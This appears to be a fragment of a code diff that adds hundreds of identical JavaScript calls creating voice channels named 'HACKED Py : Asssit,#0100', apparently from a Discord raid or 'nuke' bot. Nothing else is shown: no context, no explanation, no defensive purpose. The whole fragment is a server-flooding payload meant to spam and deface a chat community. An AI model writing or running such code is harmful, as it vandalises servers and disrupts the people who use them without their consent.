+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
